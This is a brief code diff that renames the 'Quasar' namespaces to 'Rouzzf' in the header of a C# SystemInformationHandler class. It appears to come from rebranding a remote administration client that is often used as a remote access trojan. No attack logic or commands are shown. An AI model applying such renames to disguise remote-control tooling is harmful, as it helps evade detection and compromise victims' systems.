@@ -1,15 +1,15 @@
-﻿using Quasar.Client.Helper;
-using Quasar.Client.IpGeoLocation;
-using Quasar.Client.User;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Helper;
+using Rouzzf.Client.IpGeoLocation;
+using Rouzzf.Client.User;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net.NetworkInformation;
-using Quasar.Client.IO;
+using Rouzzf.Client.IO;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class SystemInformationHandler : IMessageProcessor
     {
